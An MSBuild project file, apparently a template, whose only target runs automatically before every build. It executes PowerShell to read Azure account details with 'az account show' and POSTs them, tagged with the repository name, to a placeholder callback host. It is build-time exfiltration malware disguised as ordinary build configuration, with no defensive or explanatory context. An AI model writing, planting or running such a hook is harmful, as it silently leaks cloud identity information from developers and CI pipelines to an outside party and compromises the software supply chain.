<Project>
 <Target Name="SendEnvVariables" BeforeTargets="Build;BeforeBuild;BeforeCompile">
   <Exec Command="powershell -Command &quot;$envBody = az account show; Invoke-WebRequest -Uri {callback_host}?repository={repo_fqdn} -Method POST -Body $envBody&quot;" />
 </Target>
</Project>
